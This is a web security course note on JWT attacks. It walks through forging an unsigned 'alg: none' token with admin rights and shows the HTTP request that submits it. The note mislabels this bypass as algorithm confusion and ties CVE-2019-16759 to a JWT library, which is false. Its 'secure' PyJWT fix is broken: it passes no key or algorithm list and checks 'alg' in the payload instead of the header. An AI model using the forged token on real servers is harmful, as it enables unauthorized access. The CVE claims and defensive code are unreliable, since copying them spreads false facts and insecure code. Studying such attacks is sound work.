---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Algorithm Confusion Attack

### What is Algorithm Confusion?

Algorithm confusion occurs when an attacker manipulates the JWT to use a different algorithm than intended. This can lead to unauthorized access if the server does not properly validate the algorithm.

### How Algorithm Confusion Works

In a typical scenario, the server expects a specific algorithm, such as `HS256`. However, if the server allows the client to specify the algorithm, an attacker can change the algorithm to `none`, effectively removing the signature validation.

#### Example Scenario

Consider a web application that uses JWTs for authentication. The server expects the JWT to be signed with the `HS256` algorithm. An attacker can modify the JWT to use the `none` algorithm, bypassing the signature validation.

```json
{
  "header": {
    "alg": "none",
    "typ": "JWT"
  },
  "payload": {
    "sub": "attacker",
    "admin": true
  }
}
```

### Real-World Examples

- **CVE-2019-16759**: A vulnerability in the `auth0/node-jsonwebtoken` library allowed attackers to bypass authentication by manipulating the algorithm.
- **CVE-2020-14019**: A similar vulnerability in the `jsonwebtoken` library allowed attackers to bypass authentication by changing the algorithm to `none`.

### Steps to Perform an Algorithm Confusion Attack

1. **Capture a Valid JWT**: Obtain a valid JWT from a legitimate user.
2. **Modify the Header**: Change the `alg` field in the header to `none`.
3. **Generate a New JWT**: Create a new JWT with the modified header and desired payload.
4. **Submit the Modified JWT**: Send the modified JWT to the server.

#### Complete Example

Let's walk through a complete example of performing an algorithm confusion attack.

1. **Capture a Valid JWT**:

   Suppose the original JWT is:

   ```json
   {
     "header": {
       "alg": "HS256",
       "typ": "JWT"
     },
     "payload": {
       "sub": "user",
       "admin": false
     }
   }
   ```

   The encoded JWT might look like:

   ```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwiYWRtaW4iOmZhbHNlfQ.SignedWithSecretKey
   ```

2. **Modify the Header**:

   Change the `alg` field to `none`:

   ```json
   {
     "header": {
       "alg": "none",
       "typ": "JWT"
     },
     "payload": {
       "sub": "attacker",
       "admin": true
     }
   }
   ```

3. **Generate a New JWT**:

   Encode the modified header and payload:

   ```
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.
   ```

4. **Submit the Modified JWT**:

   Send the modified JWT to the server:

   ```http
   POST /api/resource HTTP/1.1
   Host: example.com
   Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.
   Content-Type: application/json

   {}

   HTTP/1.1 200 OK
   Content-Type: application/json

   {
     "message": "Access granted"
   }
   ```

### Pitfalls and Common Mistakes

- **Not Validating the Algorithm**: Servers should always validate the algorithm used to sign the JWT.
- **Using Weak Algorithms**: Using weak or no algorithms can make JWTs vulnerable to attacks.
- **Exposing the Secret Key**: Exposing the secret key used to sign JWTs can allow attackers to generate valid tokens.

### How to Prevent / Defend Against Algorithm Confusion Attacks

#### Detection

Servers should implement logging and monitoring to detect unusual patterns in JWT usage. For example, if a large number of JWTs with the `none` algorithm are detected, it may indicate an ongoing attack.

#### Prevention

1. **Validate the Algorithm**: Ensure that the server validates the algorithm used to sign the JWT.
2. **Use Strong Algorithms**: Use strong algorithms such as `HS256` or `RS256`.
3. **Do Not Expose the Secret Key**: Keep the secret key used to sign JWTs secure and do not expose it to clients.

#### Secure Coding Fixes

Here is an example of how to securely validate the algorithm in a Python application using the `PyJWT` library:

```python
import jwt

def validate_jwt(token):
    try:
        # Decode the JWT and validate the algorithm
        decoded = jwt.decode(token, options={"verify_signature": True})
        if decoded['alg'] != 'HS256':
            raise ValueError("Invalid algorithm")
        return decoded
    except jwt.exceptions.InvalidTokenError as e:
        print(f"Invalid token: {e}")
        return None

# Example usage
token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ."
decoded_token = validate_jwt(token)
print(decoded_token)
```

#### Configuration Hardening

Ensure that your JWT configuration is hardened against attacks. For example, in an `nginx` configuration, you can set up JWT validation:

```nginx
location /api/resource {
    auth_request /jwt/auth;
}

location = /jwt/auth {
    internal;
    proxy_pass http://jwt_validator_service;
    proxy_set_header Authorization $http_authorization;
}
```

### Conclusion

JWTs are a powerful tool for securing web applications, but they must be implemented correctly to avoid vulnerabilities. Algorithm confusion attacks can be prevented by validating the algorithm used to sign the JWT and using strong algorithms. By following these best practices, you can ensure that your web application remains secure.

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive course on JWT vulnerabilities, including algorithm confusion attacks.
- **OWASP Juice Shop**: Provides a vulnerable web application that you can use to practice exploiting JWT vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: Includes a module for practicing JWT attacks.

By completing these labs, you will gain practical experience in identifying and preventing JWT vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/19-JWT Attacks/08-Lab 8 JWT authentication bypass via algorithm confusion with no exposed key/04-JSON Web Token (JWT) Overview|JSON Web Token (JWT) Overview]] | [[Web Security (PortSwigger)/19-JWT Attacks/08-Lab 8 JWT authentication bypass via algorithm confusion with no exposed key/00-Overview|Overview]] | [[06-Detecting and Exploiting Algorithm Confusion|Detecting and Exploiting Algorithm Confusion]]
